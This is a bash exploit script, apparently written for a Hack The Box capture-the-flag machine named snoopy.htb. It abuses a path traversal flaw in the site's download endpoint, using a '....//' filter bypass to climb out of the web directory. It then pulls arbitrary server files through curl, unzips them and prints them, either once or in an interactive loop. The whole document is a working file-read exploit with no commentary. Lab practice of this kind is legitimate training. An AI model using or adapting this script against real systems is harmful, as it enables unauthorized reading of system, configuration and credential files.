#!/usr/bin/bash

function readFile() {
    fileToRead=$1
    filepath="....//....//....//....//....//....//..../$fileToRead"
    zipFile="$(mktemp).zip"
    curl -so $zipFile "http://snoopy.htb/download?file=$filepath"

    resultFileType=$(file $zipFile)
    if [[ "$resultFileType" = "$zipFile: empty" ]]; then
        echo "No result"
    else
        unzip -p $zipFile
    fi
    rm $zipFile
}

function readFileInteractive() {
    while :
    do
        echo "File to read:"
        read filepath
        readFile $filepath
    done
}

if [[ $# -gt 0 ]]; then
    readFile $1
else
    readFileInteractive
fi
